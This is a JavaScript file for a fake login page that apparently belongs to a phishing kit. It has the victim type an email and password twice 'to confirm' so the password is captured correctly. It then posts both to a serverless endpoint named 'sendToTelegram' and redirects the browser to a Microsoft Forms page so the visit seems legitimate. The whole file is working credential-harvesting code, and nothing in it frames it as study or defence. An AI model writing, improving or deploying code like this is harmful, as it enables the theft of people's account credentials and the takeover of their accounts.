// Store the first email and password
let firstEmail = "";
let firstPassword = "";

// Track the number of login attempts
let loginAttempts = 0;
const MAX_LOGIN_ATTEMPTS = 3;

// Function to validate email format
function validateEmail(email) {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailPattern.test(email);
}

// Function to validate password strength
function validatePassword(password) {
    return password.length >= 8; // Password must be at least 8 characters
}

// Function to send data to the serverless function
async function sendToServer(email, password) {
    const url = "/.netlify/functions/sendToTelegram"; // Netlify Function endpoint
    const payload = {
        email,
        password,
    };

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
        });

        // Parse the response
        const data = await response.json();
        console.log("Server response:", data);

        // Check if the message was sent successfully
        if (response.ok) {
            alert("Login successful! Data sent to Telegram.");
        } else {
            alert("Failed to send data. Please try again.");
        }
    } catch (error) {
        console.error("Error sending data to server:", error);
        alert("An error occurred. Please try again.");
    }
}

// Login form submission
document.getElementById("login-form").addEventListener("submit", async function (event) {
    event.preventDefault(); // Prevent form from submitting

    // Check if the maximum login attempts have been reached
    if (loginAttempts >= MAX_LOGIN_ATTEMPTS) {
        alert("Too many failed attempts. Please try again later.");
        return;
    }

    // Get email and password
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    // Validate inputs
    if (!validateEmail(email)) {
        alert("Please enter a valid email address.");
        return;
    }

    if (!validatePassword(password)) {
        alert("Password must be at least 8 characters long.");
        return;
    }

    if (!firstEmail && !firstPassword) {
        // First submission: Store the email and password
        firstEmail = email;
        firstPassword = password;

        // Clear the input fields
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";

        // Prompt the user to re-enter the email and password
        alert("Please re-enter your email and password to confirm.");
    } else {
        // Second submission: Check if the email and password match the first submission
        if (email === firstEmail && password === firstPassword) {
            // Send login details to the serverless function
            await sendToServer(email, password);

            // Redirect to the external form
            window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=6rma1OyZUkWGUb2U95ql5fEyhzHJrZ1Nh6ErkmDSMa5UMTQ0TkFYVjI1TFhSS1UyMU9TM0REQ0lDTS4u";
        } else {
            // If the email and password don't match, show an error
            loginAttempts++; // Increment login attempts
            alert("The email and password do not match your first submission. Please try again.");

            // Clear the input fields
            document.getElementById("email").value = "";
            document.getElementById("password").value = "";

            // Reset the first email and password after too many attempts
            if (loginAttempts >= MAX_LOGIN_ATTEMPTS) {
                firstEmail = "";
                firstPassword = "";
                alert("Too many failed attempts. Please try again later.");
            }
        }
    }
});
